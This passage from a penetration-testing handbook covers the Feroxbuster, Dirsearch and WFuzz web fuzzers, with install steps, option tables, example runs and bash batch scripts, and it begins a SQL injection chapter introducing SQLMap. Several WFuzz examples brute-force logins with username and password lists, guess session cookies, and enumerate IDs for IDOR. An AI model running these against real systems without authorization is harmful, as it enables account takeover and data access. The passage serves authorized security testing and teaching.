- Official GitHub repository: https://github.com/ffuf/ffuf
- Kali Linux tool page: https://www.kali.org/tools/ffuf/
- FFUF wiki / advanced usage: https://github.com/ffuf/ffuf/wiki

### 6.3 Feroxbuster

#### 1. Tool Introduction

Feroxbuster ("ferox" is Latin for "fierce," and it plays on "force" + "buster") is a fast, recursive content discovery tool written in Rust by Ben "epi" Risher. Its defining feature relative to Gobuster and Dirsearch is **automatic recursion**: whenever Feroxbuster discovers a directory during a scan, it automatically queues a new scan against that directory without requiring the user to manually re-run the tool. This makes it particularly effective for mapping deeply nested site structures in a single command. Feroxbuster is built on Rust's async runtime (Tokio), giving it very high throughput while maintaining low memory usage, and it includes a polished terminal UI showing live scan statistics, per-directory progress bars, and a running results table.

Feroxbuster also includes many quality-of-life features acquired over its development: automatic filtering of "wildcard" responses, extraction of links/paths from HTML and JavaScript responses to seed further scanning, support for scanning multiple targets from a file, and various output formats.

#### 2. How to Install

**Kali Linux (APT — pre-installed on many Kali images):**
```bash
sudo apt update
sudo apt install feroxbuster -y
```

**Verify installation:**
```bash
feroxbuster --version
```

**Using the official install script:**
```bash
curl -sL https://raw.githubusercontent.com/epi052/feroxbuster/main/install-nix.sh | bash
```

**Using Cargo (Rust package manager):**
```bash
cargo install feroxbuster
```

**From a release binary:**
```bash
wget https://github.com/epi052/feroxbuster/releases/latest/download/x86_64-linux-feroxbuster.zip
unzip x86_64-linux-feroxbuster.zip
chmod +x feroxbuster
sudo mv feroxbuster /usr/local/bin/
```

#### 3. Syntax

```bash
feroxbuster -u <URL> -w <WORDLIST> [options]
```

#### 4. Command-Line Options

**Target and wordlist:**

| Flag | Description |
|---|---|
| `-u, --url <URL>` | Target URL (can be repeated for multiple targets) |
| `-w, --wordlist <FILE>` | Path to wordlist (default: built-in list if none supplied) |
| `--stdin` | Read target URLs from stdin |

**Scan control:**

| Flag | Description |
|---|---|
| `-t, --threads <n>` | Number of concurrent threads (default 50) |
| `-d, --depth <n>` | Maximum recursion depth (0 = unlimited, default 4) |
| `-r, --no-recursion` | Disable recursion entirely |
| `-x, --extensions <ext>` | File extensions to append, comma or repeated flags |
| `-m, --methods <method>` | HTTP methods to use (default GET) |
| `--rate-limit <n>` | Limit requests per second |
| `-L, --time-limit <duration>` | Overall scan time limit, e.g. `30m`, `1h` |
| `--scan-limit <n>` | Max number of concurrent recursive scans |

**Filtering / matching:**

| Flag | Description |
|---|---|
| `-s, --status-codes <codes>` | Only show these status codes |
| `-C, --filter-status <codes>` | Filter out (hide) these status codes |
| `--filter-size <n>` | Filter responses of exact size(s) |
| `--filter-words <n>` | Filter responses with exact word count(s) |
| `--filter-lines <n>` | Filter responses with exact line count(s) |
| `--filter-similar-to <URL>` | Filter responses similar to a given baseline URL/page |
| `--filter-regex <regex>` | Filter responses matching a regex |
| `-N, --dont-filter` | Disable automatic wildcard/soft-404 filtering |

**Output / display:**

| Flag | Description |
|---|---|
| `-o, --output <file>` | Save output to a file |
| `--json` | Output results as JSON |
| `-q, --quiet` | Suppress banner and progress bar |
| `-v, --verbosity` | Increase verbosity (repeatable, `-vv`, `-vvv`) |
| `--silent` | Only print discovered URLs, nothing else |
| `--no-state` | Do not save a scan state file for resuming |
| `--resume-from <file>` | Resume a previous interrupted scan from its state file |

**Networking:**

| Flag | Description |
|---|---|
| `-p, --proxy <URL>` | Send requests through a proxy |
| `-H, --headers <k:v>` | Add custom HTTP headers |
| `-b, --cookies <k=v>` | Add cookies |
| `-a, --user-agent <string>` | Custom User-Agent |
| `-k, --insecure` | Disable TLS certificate validation |
| `--timeout <seconds>` | Request timeout |
| `-A, --random-agent` | Use a random User-Agent |
| `-P, --replay-proxy <URL>` | Replay matched requests to a proxy |
| `--replay-codes <codes>` | Which status codes to replay to the replay-proxy |

#### 5. Basic Usage

```bash
feroxbuster -u http://target.local -w /usr/share/wordlists/dirb/common.txt
```

Expected terminal output:
```
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.1
───────────────────────────┬──────────────────────
 🎯  Target Url             │ http://target.local
 🚀  Threads                │ 50
 📖  Wordlist               │ /usr/share/wordlists/dirb/common.txt
 👌  Status Codes           │ All Status Codes!
 💥  Timeout (secs)         │ 7
 🦡  User-Agent             │ feroxbuster/2.10.1
 💉  Config File            │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods           │ [GET]
 🔃  Recursion Depth        │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301      GET        9l       28w      313c http://target.local/admin => http://target.local/admin/
200      GET      120l      812w     4521c http://target.local/index.html
200      GET        3l        4w       45c http://target.local/robots.txt
[##############################] - 5s     4614/4614   0s      found:3       errors:0
```

#### 6. Practical Examples

**Example 1 — Basic scan:**
```bash
feroxbuster -u http://target.local -w common.txt
```
```
200      GET      120l      812w     4521c http://target.local/index.html
```

**Example 2 — Restrict recursion depth to 2:**
```bash
feroxbuster -u http://target.local -w common.txt -d 2
```
```
301      GET        9l       28w      313c http://target.local/uploads/
200      GET        5l       20w      512c http://target.local/uploads/images/
```

**Example 3 — Disable recursion entirely for a single-layer scan:**
```bash
feroxbuster -u http://target.local -w common.txt -r
```
```
200      GET       10l       50w     1024c http://target.local/login
```

**Example 4 — Add extensions:**
```bash
feroxbuster -u http://target.local -w common.txt -x php,bak,old
```
```
403      GET        8l       20w      278c http://target.local/config.php
200      GET        1l        2w       97c http://target.local/index.php.bak
```

**Example 5 — Filter out a noisy status code:**
```bash
feroxbuster -u http://target.local -w common.txt -C 404,400
```
```
301      GET        9l       28w      313c http://target.local/admin/
```

**Example 6 — Filter responses similar to a known 404 page:**
```bash
feroxbuster -u http://target.local -w common.txt --filter-similar-to http://target.local/zzzz1234
```
```
200      GET      120l      812w     4521c http://target.local/index.html
```

**Example 7 — Rate-limited scan against a production host:**
```bash
feroxbuster -u http://target.local -w common.txt --rate-limit 20
```
```
[##############################] - 3m41s   4614/4614   20/s      found:6       errors:0
```

**Example 8 — Scan multiple targets from a file:**
```bash
feroxbuster --stdin -w common.txt < targets.txt
```
```
200      GET      120l      812w     4521c http://app1.target.local/index.html
200      GET       80l      400w     3210c http://app2.target.local/index.html
```

**Example 9 — JSON output for automated parsing:**
```bash
feroxbuster -u http://target.local -w common.txt --json -o results.json
```
```
[*] Writing JSON results to results.json
```

**Example 10 — Resume an interrupted scan:**
```bash
feroxbuster --resume-from ferox-http_target_local-1234567.state
```
```
[*] Resuming scan from saved state...
```

**Example 11 — Scan through a Burp proxy and replay only 200s:**
```bash
feroxbuster -u http://target.local -w common.txt -p http://127.0.0.1:8080 \
            -P http://127.0.0.1:8080 --replay-codes 200
```
```
200      GET      120l      812w     4521c http://target.local/index.html [replayed]
```

**Example 12 — Time-boxed scan (auto-stop after 15 minutes):**
```bash
feroxbuster -u http://target.local -w big.txt -L 15m
```
```
[*] Time limit reached (15m), stopping scan...
```

#### 7. Common Use Cases

- Deep, automatic recursive mapping of large or deeply nested web applications in one command.
- Rapid initial recon on CTF and bug bounty targets where directory depth is unknown.
- Batch scanning many discovered subdomains/vhosts at once via `--stdin`.
- Long-running scans on large wordlists where resumability (`--resume-from`) matters.
- Chaining discovered endpoints into a Burp Suite workflow via `--replay-proxy`.

#### 8. Automation with Bash

```bash
#!/usr/bin/env bash
# ferox_multi.sh - recursive scan across multiple subdomains with JSON output

WORDLIST="/usr/share/wordlists/dirb/common.txt"
OUTDIR="ferox_results_$(date +%Y%m%d)"
mkdir -p "$OUTDIR"

while IFS= read -r host; do
    [ -z "$host" ] && continue
    name=$(echo "$host" | sed 's~https\?://~~; s~/~~g')
    echo "[*] Scanning $host"
    feroxbuster -u "$host" -w "$WORDLIST" -d 3 --rate-limit 50 \
        --json -o "$OUTDIR/${name}.json" -q
done < subdomains.txt

echo "[*] Batch scan complete -> $OUTDIR"
```

#### 9. Tips and Best Practices

- Use `--filter-similar-to` on targets with dynamic "not found" pages instead of relying purely on status-code filtering.
- Cap recursion with `-d` on very large or deeply structured sites to avoid runaway scan time; Feroxbuster's automatic recursion can grow scope quickly.
- Use `--scan-limit` to bound the number of simultaneous recursive sub-scans on resource-constrained systems.
- Enable `--resume-from` workflows for long scans on unreliable networks or VPN links so progress isn't lost.
- Use `-q`/`--silent` combined with `-o`/`--json` when embedding Feroxbuster into automated pipelines.
- The built-in config file at `/etc/feroxbuster/ferox-config.toml` lets you set persistent defaults (threads, wordlist, headers) instead of repeating flags every run.

#### 10. Troubleshooting

| Problem | Cause / Fix |
|---|---|
| Scan explodes into thousands of recursive sub-scans | Lower `-d` depth or add `-r` to disable recursion |
| Everything returns 200 (soft-404) | Use `--filter-similar-to` or `--filter-size`/`--filter-words` to remove noise |
| Scan interrupted (Ctrl+C, network drop) | Re-run with `--resume-from <state-file>`; Feroxbuster auto-saves state periodically |
| High memory/CPU usage | Lower `-t` threads and `--scan-limit`; avoid unlimited depth (`-d 0`) on huge sites |
| TLS errors on self-signed certs | Add `-k`/`--insecure` |
| Output too noisy in terminal | Use `-q` for quiet mode or redirect to `-o`/`--json` |

#### 11. References

- Official GitHub repository: https://github.com/epi052/feroxbuster
- Official documentation site: https://epi052.github.io/feroxbuster-docs/
- Kali Linux tool page: https://www.kali.org/tools/feroxbuster/

### 6.4 Dirsearch

#### 1. Tool Introduction

Dirsearch is a Python-based command-line web path scanner developed by Mauro Soria (maurosoria) and maintained by an active open-source community. It is one of the oldest and most widely used content discovery tools in the penetration testing community, valued for its carefully curated default wordlist (`db/dicc.txt`), extensive built-in extension handling, multithreading, and flexible reporting formats (plain text, JSON, CSV, XML, Markdown, and simple HTML). Dirsearch also supports "smart" behavior such as automatically detecting the target's technology stack to select relevant extensions, recursive brute-forcing of discovered directories, and dynamic exclusion of "blank"/false-positive pages.

Because it is written in Python, Dirsearch is easy to install, modify, and extend, and it runs identically across Linux, macOS, and Windows, making it a common cross-platform choice.

#### 2. How to Install

**Kali Linux (APT — recommended, pre-installed on many Kali images):**
```bash
sudo apt update
sudo apt install dirsearch -y
```

**Verify installation:**
```bash
dirsearch --version
```

**From source (GitHub, gives the latest features):**
```bash
git clone https://github.com/maurosoria/dirsearch.git --depth 1
cd dirsearch
python3 -m pip install -r requirements.txt
python3 dirsearch.py -h
```

**Via pip:**
```bash
pip3 install dirsearch
```

#### 3. Syntax

```bash
dirsearch -u <URL> [options]
```
or, when run from source:
```bash
python3 dirsearch.py -u <URL> [options]
```

#### 4. Command-Line Options

**Mandatory / target:**

| Flag | Description |
|---|---|
| `-u, --url <URL>` | Target URL |
| `-l, --url-list <FILE>` | File containing a list of target URLs |
| `--stdin` | Read target list from stdin |
| `-e, --extensions <ext>` | Extensions to scan for, comma separated (e.g. `php,asp,aspx,jsp,html`) |
| `-E, --extensions-list <name>` | Use a pre-defined extension list (e.g. `php`, `asp`) |
| `-f, --force-extensions` | Add extensions to every wordlist entry, even ones with dots |

**Dictionary / wordlist:**

| Flag | Description |
|---|---|
| `-w, --wordlists <FILE>` | Custom wordlist(s), comma separated for multiple |
| `--prefixes <str>` | Add prefixes to each wordlist entry |
| `--suffixes <str>` | Add suffixes to each wordlist entry |
| `-U, --uppercase` | Uppercase wordlist entries |
| `-L, --lowercase` | Lowercase wordlist entries |
| `-C, --capital` | Capitalize wordlist entries |

**Request options:**

| Flag | Description |
|---|---|
| `-m, --http-method <method>` | HTTP method (default GET) |
| `-d, --data <data>` | POST data |
| `-H, --header <k:v>` | Custom header, repeatable |
| `--header-list <FILE>` | Load headers from file |
| `-b, --cookie <string>` | Cookie header |
| `-a, --user-agent <string>` | Custom User-Agent |
| `--random-agent` | Random User-Agent per request |
| `-F, --follow-redirects` | Follow redirects |
| `-x, --exclude-status <codes>` | Exclude these HTTP status codes |
| `-i, --include-status <codes>` | Only include these HTTP status codes |
| `--proxy <URL>` | Proxy URL |
| `--timeout <n>` | Request timeout (seconds) |

**Scan behavior / performance:**

| Flag | Description |
|---|---|
| `-t, --threads <n>` | Number of threads (default 25) |
| `--delay <n>` | Delay between requests (seconds) |
| `-r, --recursive` | Enable recursive brute-forcing |
| `-R, --max-recursion-depth <n>` | Maximum recursion depth |
| `--recursion-status <codes>` | Status codes that trigger recursion (default 200,301,302,307,401,403) |
| `--exclude-sizes <sizes>` | Exclude responses of given size(s) |
| `--exclude-texts <text>` | Exclude responses containing given text |
| `--exclude-regex <regex>` | Exclude responses matching regex |
| `--skip-on-status <codes>` | Skip target entirely if given status appears repeatedly (e.g., detecting a WAF block) |

**Output / reporting:**

| Flag | Description |
|---|---|
| `-o, --output <FILE>` | Output file |
| `--format <fmt>` | Report format: `simple, plain, json, xml, md, csv, html, sqlite` |
| `-q, --quiet-mode` | Suppress banner/verbose console output |
| `--full-url` | Print full URLs instead of relative paths in output |

#### 5. Basic Usage

```bash
dirsearch -u http://target.local -e php,html,txt
```

Expected terminal output:
```
  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, html, txt | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Target: http://target.local/

[12:03:41] Starting: 
[12:03:42] 200 -    4KB - /index.html
[12:03:42] 301 -  313B  - /admin  ->  http://target.local/admin/
[12:03:44]  45B - /robots.txt
[12:03:47] 403 -  278B  - /config.php

Task Completed
```

#### 6. Practical Examples

**Example 1 — Basic scan with common extensions:**
```bash
dirsearch -u http://target.local -e php,html,js
```
```
[12:00:01] 200 -   4KB - /index.html
```

**Example 2 — Recursive scanning of discovered folders:**
```bash
dirsearch -u http://target.local -e php -r -R 3
```
```
[12:00:10] 301 -  313B  - /uploads/  ->  recursing...
[12:00:14] 200 -  512B  - /uploads/backup.php
```

**Example 3 — Scan a list of targets:**
```bash
dirsearch -l targets.txt -e php,html
```
```
Target: http://app1.target.local/
[12:00:20] 200 -   3KB - /index.php
Target: http://app2.target.local/
[12:00:35] 200 -   2KB - /index.html
```

**Example 4 — Exclude noisy status codes:**
```bash
dirsearch -u http://target.local -x 400,404,500
```
```
[12:01:01] 301 -  313B  - /admin/
```

**Example 5 — Only include specific status codes:**
```bash
dirsearch -u http://target.local -i 200,403
```
```
[12:01:10] 200 -   4KB - /index.html
[12:01:12] 403 -  278B  - /config.php
```

**Example 6 — Custom headers for authenticated scanning:**
```bash
dirsearch -u http://target.local -H "Authorization: Bearer eyJhbGciOi..."
```
```
[12:01:30] 200 -  900B  - /api/profile
```

**Example 7 — Custom wordlist and prefixes/suffixes:**
```bash
dirsearch -u http://target.local -w custom.txt --suffixes .bak,.old
```
```
[12:01:45] 200 -  512B  - /config.bak
```

**Example 8 — Save results as JSON:**
```bash
dirsearch -u http://target.local -e php --format json -o results.json
```
```
[*] Report saved to results.json
```

**Example 9 — Reduce speed for a sensitive/production target:**
```bash
dirsearch -u http://target.local -t 5 --delay 0.5
```
```
[12:02:30] 200 -   4KB - /index.html
```

**Example 10 — Through a proxy for manual review in Burp Suite:**
```bash
dirsearch -u http://target.local --proxy http://127.0.0.1:8080
```
```
[*] All requests routed through 127.0.0.1:8080
```

**Example 11 — Skip target automatically if it appears WAF-blocked:**
```bash
dirsearch -u http://target.local --skip-on-status 429
```
```
[12:03:00] WARNING: Received repeated 429 responses, skipping target
```

**Example 12 — Full URL output and quiet mode for scripting:**
```bash
dirsearch -u http://target.local -e php --full-url -q -o out.txt --format plain
```
```
http://target.local/index.php  200
```

#### 7. Common Use Cases

- General-purpose web content discovery using its large, curated default dictionary.
- Bulk scanning of many targets from a file during external assessments or bug bounty recon.
- Recursive crawling of an application's directory tree without manually re-invoking the tool.
- Generating structured reports (JSON/XML/CSV/HTML) for inclusion in penetration test deliverables.
- Fine-tuned scanning against WAF-protected or rate-limited targets using `--delay`, `-t`, and `--skip-on-status`.

#### 8. Automation with Bash

```bash
#!/usr/bin/env bash
# dirsearch_batch.sh - scan multiple targets and generate JSON reports

TARGET_FILE="targets.txt"
EXT="php,asp,aspx,jsp,html,js,txt,bak"
OUTDIR="dirsearch_reports"
mkdir -p "$OUTDIR"

while IFS= read -r url; do
    [ -z "$url" ] && continue
    name=$(echo "$url" | sed 's~https\?://~~; s~/~~g')
    echo "[*] Scanning $url"
    dirsearch -u "$url" -e "$EXT" -t 30 -r -R 2 \
        --format json -o "$OUTDIR/${name}.json" -q
done < "$TARGET_FILE"

echo "[*] Done. Reports saved under $OUTDIR/"
```

#### 9. Tips and Best Practices

- Let Dirsearch's default dictionary (`db/dicc.txt`) do the heavy lifting first; it is curated specifically to minimize noise while maximizing hit rate.
- Use `-i`/`-x` to iterate quickly: start broad, then narrow to specific status codes once you understand the target's baseline behavior.
- Combine `-r` (recursive) with `-R` (max depth) to avoid unbounded scan time on deeply structured applications.
- Use `--random-agent` and `--delay` when scanning targets protected by basic rate-limiting or bot-detection.
- Generate `--format html` reports when deliverables need to be shared with non-technical stakeholders.
- Use `-l`/`--stdin` for scanning many hosts discovered during subdomain enumeration in one batch run.

#### 10. Troubleshooting

| Problem | Cause / Fix |
|---|---|
| Too many false positives (soft-404s) | Use `--exclude-sizes`, `--exclude-texts`, or `--exclude-regex` to filter the noise pattern |
| Scan is very slow | Increase `-t` threads (watch for target rate-limiting) or reduce wordlist size with `-e` filtering |
| Getting HTTP 429 / blocked mid-scan | Add `--delay`, reduce `-t`, use `--skip-on-status 429`, or rotate `--proxy` |
| Recursive scan runs forever | Set `-R` to a reasonable max depth, or remove `-r` and drill down manually |
| SSL errors on self-signed certs | Dirsearch generally handles this automatically; if issues persist, check `--timeout` and proxy settings |
| No output file created | Confirm `--format` and `-o` were both specified and the output directory is writable |

#### 11. References

- Official GitHub repository: https://github.com/maurosoria/dirsearch
- Kali Linux tool page: https://www.kali.org/tools/dirsearch/
- Project wiki / usage docs: https://github.com/maurosoria/dirsearch/wiki

### 6.5 WFuzz

#### 1. Tool Introduction

WFuzz is a Python-based web application fuzzing framework created by Xavier Mendez (Xavi/Christian Martorella lineage project, now community-maintained). It predates many of the modern Go-based fuzzers and remains popular for its maturity and extreme flexibility: like FFUF, WFuzz uses a placeholder keyword — `FUZZ` — that can be substituted anywhere in a request (URL path, headers, POST data, cookies, even multiple positions with `FUZZ`, `FUZ2Z`, etc.). WFuzz's particular strength lies in its rich plugin/encoder ecosystem, its ability to iterate over multiple wordlists with different combination strategies (e.g., "product" vs "chain" iteration), and its baked-in payload generators (not just flat wordlists, but ranges, permutations, and external command output).

WFuzz is commonly used for directory/file brute-forcing, but it is equally at home fuzzing GET/POST parameters, HTTP headers (including for header-injection or host-header attacks), cookies, and even fuzzing multiple positions simultaneously to test for parameter-pollution or IDOR-style vulnerabilities.

#### 2. How to Install

**Kali Linux (APT — pre-installed on many Kali images):**
```bash
sudo apt update
sudo apt install wfuzz -y
```

**Verify installation:**
```bash
wfuzz --version
```

**Via pip:**
```bash
pip3 install wfuzz
```

**From source:**
```bash
git clone https://github.com/xmendez/wfuzz.git
cd wfuzz
python3 setup.py install
```

#### 3. Syntax

```bash
wfuzz [options] -z <PAYLOAD_TYPE>,<PAYLOAD_SOURCE> <URL_WITH_FUZZ_KEYWORD>
```

The `-z` payload flag is central to WFuzz: it defines both a payload **type** (e.g., `file`, `range`, `list`) and its **source** (e.g., a wordlist path).

#### 4. Command-Line Options

**Payload / iteration:**

| Flag | Description |
|---|---|
| `-z <type>,<source>` | Define a payload; type can be `file`, `list`, `range`, `command`, etc. |
| `-w <FILE>` | Shortcut equivalent to `-z file,<FILE>` |
| `--zP <params>` | Extra parameters for the payload encoder/generator |
| `-c` | Colorize the console output |
| `--iterator=<method>` | Iteration strategy across multiple payload positions: `product`, `zip`, `chain` |

**Filtering / matching results:**

| Flag | Description |
|---|---|
| `--sc <codes>` | Show only these response status codes |
| `--hc <codes>` | Hide these response status codes |
| `--sl <n>` / `--hl <n>` | Show / hide by number of lines |
| `--sw <n>` / `--hw <n>` | Show / hide by number of words |
| `--sh <n>` / `--hh <n>` | Show / hide by response size (chars/bytes) |
| `--ss <regex>` / `--hs <regex>` | Show / hide responses matching a regex |
| `--filter <expr>` | Advanced filter expression (e.g., `c=200 and l>10`) |

**Request customization:**

| Flag | Description |
|---|---|
| `-X <method>` | HTTP method |
| `-d <data>` | POST data (can contain `FUZZ`) |
| `-H "<header>"` | Custom header (can contain `FUZZ`) |
| `-b "<cookie>"` | Cookie (can contain `FUZZ`) |
| `--follow` | Follow HTTP redirects |
| `-p <proxy>` | Proxy address, `--zP` compatible |
| `-t <n>` | Number of concurrent threads (default 10) |
| `-s <n>` | Delay in seconds between requests |
| `-R <depth>` | Recursion depth for recursive brute-forcing |
| `-A` | Ignore SSL/TLS certificate errors |

**Output:**

| Flag | Description |
|---|---|
| `-f <file>,<format>` | Write output to file in given format (`raw`, `json`, `html`, `csv`, etc.) |
| `-v` | Verbose output |
| `-o <format>` | Change console output format (`text`, `json`, `html`, `csv`) |
| `--dry-run` | Show what would be requested without sending requests |

#### 5. Basic Usage

```bash
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 http://target.local/FUZZ
```

Expected terminal output:
```
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://target.local/FUZZ
Total requests: 4614

=====================================================================
ID     Response   Lines    Word       Chars       Payload
=====================================================================

000012:  200        120 L    812 W    4521 Ch     "index.html"
000045:  301          9 L     28 W     313 Ch     "admin"
000078:  200          3 L      4 W      45 Ch     "robots.txt"

Total time: 12.4104
Processed Requests: 4614
Filtered Requests: 4611
Requests/sec.: 371.9
```

#### 6. Practical Examples

**Example 1 — Basic directory brute-force hiding 404s:**
```bash
wfuzz -c -z file,common.txt --hc 404 http://target.local/FUZZ
```
```
000045:  301   9 L   28 W   313 Ch   "admin"
```

**Example 2 — Filter by response size instead of status code:**
```bash
wfuzz -c -z file,common.txt --hh 4521 http://target.local/FUZZ
```
```
000045:  301   9 L   28 W   313 Ch   "admin"
```

**Example 3 — Extension fuzzing:**
```bash
wfuzz -c -z file,common.txt --hc 404 http://target.local/FUZZ.php
```
```
000010:  403   8 L   20 W   278 Ch   "config"
```

**Example 4 — POST parameter/value fuzzing:**
```bash
wfuzz -c -z file,users.txt -d "username=FUZZ&password=test" \
      --hc 401 http://target.local/login
```
```
000005:  200   250 L   1900 W   1902 Ch   "admin"
```

**Example 5 — Multiple payload positions (users x passwords) with product iteration:**
```bash
wfuzz -c --iterator=product -z file,users.txt -z file,passwords.txt \
      -d "user=FUZZ&pass=FUZ2Z" --hc 401 http://target.local/login
```
```
000112:  200   250 L   1900 W   1902 Ch   "admin - Summer2024!"
```

**Example 6 — Header fuzzing (Host header for vhost discovery):**
```bash
wfuzz -c -z file,vhosts.txt -H "Host: FUZZ.target.local" \
      --hh 0 http://target.local/
```
```
000003:  200   90 L   400 W   3120 Ch   "staging"
```

**Example 7 — Cookie value fuzzing:**
```bash
wfuzz -c -z file,session_ids.txt -b "PHPSESSID=FUZZ" \
      --sc 200 http://target.local/dashboard
```
```
000027:  200   60 L   250 W   1902 Ch   "a1b2c3d4e5f6"
```

**Example 8 — Numeric range fuzzing (IDOR-style testing):**
```bash
wfuzz -c -z range,1-100 --sc 200 http://target.local/user?id=FUZZ
```
```
000014:  200   40 L   200 W   980 Ch   "14"
```

**Example 9 — Using an advanced filter expression:**
```bash
wfuzz -c -z file,common.txt --filter "c=200 and l>50" http://target.local/FUZZ
```
```
000012:  200   120 L   812 W   4521 Ch   "index.html"
```

**Example 10 — Recursive brute-forcing of discovered directories:**
```bash
wfuzz -c -z file,common.txt -R 2 --hc 404 http://target.local/FUZZ
```
```
000045:  301   9 L   28 W   313 Ch   "admin"
[recursing into admin/]
000201:  200   10 L   50 W    920 Ch   "admin/login.php"
```

**Example 11 — Output results to a JSON report:**
```bash
wfuzz -z file,common.txt --hc 404 -f wfuzz_results.json,json http://target.local/FUZZ
```
```
[*] Saving results to wfuzz_results.json
```

**Example 12 — Slow, throttled scan against a sensitive target:**
```bash
wfuzz -c -z file,common.txt -t 5 -s 1 --hc 404 http://target.local/FUZZ
```
```
000045:  301   9 L   28 W   313 Ch   "admin"
Requests/sec.: 4.9
```

#### 7. Common Use Cases

- Directory and file brute-forcing with granular multi-criteria filtering (status, size, word count, regex).
- Parameter, header, and cookie fuzzing for discovering hidden functionality or testing input handling.
- Multi-position fuzzing for combined username/password testing or parameter-pollution style checks (in authorized testing only).
- Numeric ID fuzzing to probe for Insecure Direct Object Reference (IDOR) vulnerabilities.
- Virtual host and Host-header based discovery, similar to FFUF's vhost fuzzing.
- Fine-grained, scriptable fuzzing for edge cases not well covered by simpler "one wordlist, one URL" tools.

#### 8. Automation with Bash

```bash
#!/usr/bin/env bash
# wfuzz_sweep.sh - directory + vhost sweep using wfuzz

TARGET="$1"                    # e.g. http://target.local
DIRLIST="/usr/share/wordlists/dirb/common.txt"
VHOSTLIST="vhosts.txt"
OUT="wfuzz_out_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUT"

echo "[*] Directory fuzz on $TARGET"
wfuzz -z file,"$DIRLIST" --hc 404 -f "$OUT/dirs.json,json" "$TARGET/FUZZ"

DOMAIN=$(echo "$TARGET" | sed 's~https\?://~~')
echo "[*] Vhost fuzz on $DOMAIN"
wfuzz -z file,"$VHOSTLIST" -H "Host: FUZZ.$DOMAIN" --hh 0 \
      -f "$OUT/vhosts.json,json" "$TARGET/"

echo "[*] Sweep complete -> $OUT"
```

#### 9. Tips and Best Practices

- Always pair a first "baseline" request against a known-nonexistent path to learn the soft-404 signature (size/word/line count), then use `--hh`/`--hw`/`--hl` to filter it out.
- Prefer `--filter` expressions for complex multi-condition logic instead of stacking many `--sc`/`--hc` flags.
- Use `--iterator=product` deliberately — it multiplies request count by the size of every payload list, so scope it carefully with smaller lists first.
- Use `-t` and `-s` together to throttle scans against rate-limited or production targets.
- Save results with `-f file,json` (or `csv`/`html`) for reporting and to diff against future scans.
- Because WFuzz can fuzz literally any part of a request, it is often the right tool once Gobuster/FFUF/Feroxbuster/Dirsearch have already mapped the obvious surface and deeper, more targeted fuzzing is needed.

#### 10. Troubleshooting

| Problem | Cause / Fix |
|---|---|
| All results returned (soft-404 not filtered) | Add `--hc`, `--hh`, `--hw`, or `--filter` based on a baseline request |
| `Fatal exception: Unknown iterator` | Check `--iterator` value spelling (`product`, `zip`, `chain`) |
| Scan far slower than expected | Reduce `-s` delay to 0, or increase `-t` threads carefully |
| SSL errors | Add `-A` to ignore certificate validation issues on lab targets |
| `FUZZ` not being replaced | Confirm the literal keyword `FUZZ` (case-sensitive) appears in the URL/header/data, and that `-z` payload count matches the number of `FUZZ`/`FUZ2Z` placeholders |
| Deprecation warnings on run | Common with older WFuzz + newer Python versions; update via pip or use the Kali-packaged version |

#### 11. References

- Official GitHub repository: https://github.com/xmendez/wfuzz
- Official documentation: https://wfuzz.readthedocs.io/
- Kali Linux tool page: https://www.kali.org/tools/wfuzz/

## Chapter 7 – SQL Injection

SQL Injection (SQLi) is one of the oldest and most damaging vulnerability classes in web application security. It occurs when untrusted user input is concatenated directly into a SQL query without proper sanitization, parameterization, or escaping, allowing an attacker to alter the logic of the query itself. Because databases sit at the heart of nearly every modern web application — storing everything from user credentials and session tokens to financial records and personal data — a successful SQL injection attack can lead to authentication bypass, data exfiltration, data tampering, privilege escalation, and in many cases full remote code execution on the underlying database server or host operating system.

Despite being a well-documented vulnerability class for over two decades (it has appeared in the OWASP Top 10 since its inception), SQL injection remains prevalent because of legacy codebases, poor input validation practices, dynamic query building, and the sheer complexity of modern multi-tier applications that mix relational and non-relational data stores. This chapter focuses on the practical, offensive side of SQL injection: the tools that penetration testers and security researchers use — inside a properly authorized and legal testing environment — to detect, confirm, and exploit SQL injection vulnerabilities efficiently.

This chapter covers three tools, each targeting a different niche of the injection landscape:

- **SQLMap** — the industry-standard, open-source automatic SQL injection and database takeover tool for classic relational databases (MySQL, PostgreSQL, MSSQL, Oracle, SQLite, and many more).
- **NoSQLMap** — a tool purpose-built to identify and exploit NoSQL injection vulnerabilities and insecure configurations, primarily targeting MongoDB and Node.js/Express-based applications.
- **jSQL Injection** — a lightweight, Java-based GUI tool for automated SQL injection, popular for its cross-platform nature and ease of use directly from a graphical interface.


> **Legal Notice:** SQL injection testing must only be performed against systems you own or for which you have explicit, written authorization (e.g., a signed penetration testing engagement, a CTF, or a deliberately vulnerable lab such as DVWA, bWAPP, or PortSwigger Web Security Academy). Unauthorized use of these tools against systems you do not have permission to test is illegal in most jurisdictions.

### 7.1 SQLMap

#### 1. Tool Introduction

SQLMap is a free, open-source penetration testing tool written in Python that automates the process of detecting and exploiting SQL injection (SQLi) vulnerabilities and taking over database servers. It was created by Bernardo Damele and Miroslav Stampar and is maintained as an active open-source project on GitHub. SQLMap is considered the de-facto industry standard for automated SQL injection testing and is included by default in Kali Linux, Parrot OS, and most other penetration testing distributions.

SQLMap comes with a powerful detection engine capable of identifying six different types of SQL injection:

- **Boolean-based blind** — infers true/false conditions from differences in page content.
- **Time-based blind** — infers true/false conditions from response time delays (e.g., `SLEEP()`).
- **Error-based** — extracts data directly from database error messages.
- **UNION query-based** — appends a `UNION SELECT` statement to retrieve data in the same response.
- **Stacked queries** — executes multiple statements separated by semicolons (where supported).
- **Out-of-band (OOB)** — exfiltrates data through DNS or HTTP requests initiated by the database.

It supports a very broad set of database management systems, including MySQL, PostgreSQL, Microsoft SQL Server, Oracle, SQLite, IBM DB2, Firebird, Sybase, SAP MaxDB, Informix, MariaDB, Amazon Redshift, Vertica, Cache, H2, MonetDB, Presto, Apache Derby, and CockroachDB.

